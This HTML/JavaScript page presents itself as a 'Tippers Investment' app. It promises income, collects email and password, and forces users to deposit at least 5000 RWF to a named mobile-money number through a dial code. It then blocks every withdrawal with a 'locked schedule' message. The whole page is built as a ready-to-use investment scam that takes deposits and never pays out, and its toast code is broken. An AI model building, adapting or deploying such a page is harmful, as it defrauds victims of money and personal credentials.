<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
animation:fade 0.4s;
}

@keyframes fade{
from{opacity:0;transform:translateY(10px);}
to{opacity:1;}
}

.title{
color:#f59e0b;
text-align:center;
font-weight:bold;
}

.desc{text-align:center;margin-top:10px}

label{margin-top:10px;display:block}

input,select{
width:100%;
padding:10px;
margin-top:5px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:#f59e0b;
font-weight:bold;
cursor:pointer;
}

.row{display:flex;gap:5px}

.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}

.nav div{text-align:center;cursor:pointer}
.nav i{display:block;font-size:20px}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav hidden" id="nav">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>

</div>

<div id="toast"></div>

<script>

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

let user=null;
let depositDone=false;
let amount=0;

/* TOAST */
function toast(msg){
toastBox.innerText=msg;
toastBox.style.display="block";
setTimeout(()=>toastBox.style.display="none",2500);
}

/* START */
function start(){
nav.classList.add("hidden");
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start now and grow your income smartly in tippers earning every time.</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`

<h3 class="title">REGISTER</h3>

<input id="email" placeholder="enter your email">
<input id="pass" placeholder="6 digit password">
<input id="cpass" placeholder="confirm password">

<button onclick="doRegister()">REGISTER</button>
`;
}

function doRegister(){

let e=email.value;
let p=pass.value;
let c=cpass.value;

if(!e||!p||!c){
toast("Fill all fields ❌");return;
}

if(!e.endsWith("@gmail.com")){
toast("Invalid email ❌");return;
}

if(!/^[0-9]{6}$/.test(p)){
toast("Password must be 6 digits ❌");return;
}

if(p!==c){
toast("Passwords not match ❌");return;
}

user={email:e,pass:p};
toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`

<h3 class="title">Login to continue</h3>

<input id="le" placeholder="enter your email">
<input id="lp" placeholder="password">

<div style="display:flex;justify-content:space-between">
<span onclick="forgot()" style="color:#f59e0b;cursor:pointer">Forgot password</span>
<span onclick="register()" style="color:#f59e0b;cursor:pointer">Create account</span>
</div>

<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){

if(!le.value||!lp.value){
toast("Fill all fields ❌");return;
}

if(le.value!==user.email){
toast("Invalid email ❌");return;
}

if(lp.value!==user.pass){
toast("Invalid password ❌");return;
}

nav.classList.remove("hidden");
deposit(); // force deposit
}

/* FORGOT */
function forgot(){
screen.innerHTML=`

<h3 class="title">Reset Password</h3>

<input id="fe" placeholder="enter your email">
<input id="np" placeholder="new password">

<button onclick="reset()">RESET</button>
`;
}

function reset(){
if(fe.value!==user.email){
toast("Email not found ❌");return;
}

if(!/^[0-9]{6}$/.test(np.value)){
toast("Password must be 6 digits ❌");return;
}

user.pass=np.value;
toast("Password updated ✔");
login();
}

/* HOME */
function home(){
if(!depositDone){
toast("To activate other services, you must finish deposit and get license.");
return;
}
toast("Wait for withdraw time.");
}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`

<h3 class="title">DEPOSIT BALANCE</h3>

<input id="amt" placeholder="amount">
<p>Minimum 5000 RWF</p>

<input id="sender" placeholder="sender name">

<button onclick="pay()">CONTINUE</button>
`;
}

function pay(){
let a=parseInt(amt.value);
if(!a||a<5000||!sender.value){
toast("Invalid input ❌");return;
}
amount=a;
payment();
}

/* PAYMENT */
function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT</h3>
<div>0795410739<br>BARAKA</div>
<button onclick="dial()">DIAL & PAY</button>
`;
}

/* DIAL */
function dial(){
screen.innerHTML=`
<div>*182*1*1*0795410739#</div>
<input type="file" id="file">
<button onclick="submitProof()">SUBMIT</button>
`;
}

function submitProof(){
if(!file.value){
toast("Upload proof ❌");return;
}
withdrawPeriod();
}

/* PERIOD */
function withdrawPeriod(){
screen.innerHTML=`

<select id="period">
<option>1day</option>
<option>7days</option>
<option>14days</option>
<option>45days</option>
<option>3month</option>
<option>4month</option>
</select>

<button onclick="confirm()">SEND & CONFIRM</button>
`;
}

function confirm(){
depositDone=true;
dashboard();
}

/* DASHBOARD */
function dashboard(){
screen.innerHTML=`
<h3 class="title">Balance: ${amount} RWF</h3>
<p class="desc">Withdraw available only after selected period</p>
`;
}

/* WITHDRAW */
function withdraw(){

if(!depositDone){
toast("Finish deposit first ❌");return;
}

let w=prompt("Enter amount");

if(!w||w<7500){
toast("INVALID INPUT ❌");return;
}

toast("You're not allowed to withdraw before the locked schedule.");
}

/* START */
start();

</script>

</body>
</html>
